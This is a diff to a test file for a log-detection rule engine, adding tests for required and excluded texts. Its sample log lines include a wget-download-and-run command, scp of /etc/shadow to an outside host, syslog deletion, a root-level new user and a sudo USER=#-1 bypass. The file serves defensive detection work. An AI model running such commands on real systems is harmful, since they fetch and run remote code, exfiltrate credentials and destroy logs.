@@ -324,7 +324,7 @@ def test_keyword_alerts_are_grouped_by_the_chosen_field():
     assert [d.key for d in by_user] == ["bob", "eve"]
 
 
-# --- keyword: any text in between ------------------------------------------------------------
+# --- keyword: any text in between, required and excluded texts -------------------------------
 
 FETCH = "COMMAND=/bin/sh -c wget http://198.51.100.9/a.sh -O /tmp/a; chmod +x /tmp/a; /tmp/a"
 
@@ -361,6 +361,38 @@ def test_escaped_asterisk_is_an_asterisk():
     rule = keyword_rule(keywords=[r"rm -rf \*"])
     assert len(detect(rule, [line("COMMAND=/bin/rm -rf *")])) == 1
     assert detect(rule, [line("COMMAND=/bin/rm -rf /tmp/build")]) == []
+
+
+def test_required_text_must_be_there_too_and_is_marked():
+    message = "COMMAND=/usr/bin/scp /etc/shadow eve@203.0.113.99:/tmp/"
+    rule = keyword_rule(keywords=["scp ", "rsync "], require=[["@", "::"]])
+    [detection] = detect(rule, [line(message)])
+    assert marked(detection, message) == ["scp ", "@"]
+
+    assert detect(rule, [line("COMMAND=/usr/bin/scp /etc/hosts /tmp/")]) == []
+    assert detect(rule, [line("mail from eve@example.org")]) == []
+
+
+def test_every_required_entry_must_be_satisfied():
+    rule = keyword_rule(keywords=["new user"], require=["UID=0,", ["GID=0,", "GID=27,"]])
+    assert len(detect(rule, [line("new user: name=mallory, UID=0, GID=27, home=/root")])) == 1
+    assert detect(rule, [line("new user: name=carol, UID=1004, GID=27, home=/home/carol")]) == []
+    assert detect(rule, [line("new user: name=mallory, UID=0, GID=1004, home=/root")]) == []
+
+
+def test_excluded_text_rules_a_line_out():
+    rule = keyword_rule(keywords=["rm /var/log/syslog"], exclude=["/syslog."])
+    assert len(detect(rule, [line("COMMAND=/bin/rm /var/log/syslog")])) == 1
+    assert detect(rule, [line("COMMAND=/bin/rm /var/log/syslog.7.gz")]) == []
+
+
+def test_required_and_excluded_texts_apply_to_a_regex_as_well():
+    rule = keyword_rule(
+        keywords=[], regex=r"USER=#-?\d+", require=["COMMAND="], exclude=["USER=#0 "]
+    )
+    assert len(detect(rule, [line("TTY=pts/0 ; USER=#-1 ; COMMAND=/bin/bash")])) == 1
+    assert detect(rule, [line("TTY=pts/0 ; USER=#-1")]) == []
+    assert detect(rule, [line("TTY=pts/0 ; USER=#0 ; COMMAND=/bin/bash")]) == []
 
 
 # --- evaluate: the alerts table --------------------------------------------------------------
@@ -530,13 +562,17 @@ LINES = [
     [
         ({"keywords": ["wget *; chmod +x"]}, [1, 13]),
         ({"keywords": ["*wget *"]}, [1, 13]),
+        ({"keywords": ["scp ", "rsync "], "require": [["@", "::"]]}, [2]),
         ({"keywords": [r"rm -rf \*"]}, [4]),
-        ({"keywords": ["rm /var/log/syslog", "mv *syslog"]}, [6, 7]),
+        ({"keywords": ["rm /var/log/syslog", "mv *syslog"], "exclude": ["/syslog."]}, [6]),
         ({"keywords": ["100%"]}, [8]),
         ({"keywords": ["10%percent"]}, []),  # a percent sign is not "anything"
         ({"keywords": ["temp_file"]}, [9]),  # nor is an underscore "any character"
         ({"keywords": [r"C:\Users\\*\temp"]}, [9]),
+        ({"keywords": ["new user"], "require": ["UID=0,", ["GID=0,", "GID=27,"]]}, [11]),
         ({"keywords": ["çözüm*CHMOD"]}, [13]),
+        ({"keywords": ["wget"], "require": ["çözüm"]}, [13]),
+        ({"keywords": [], "regex": r"UID=\d+", "require": ["gid=27"], "exclude": ["carol"]}, [11]),
     ],
 )
 def test_database_and_evaluator_agree_on_which_lines_count(session, fields, expected):
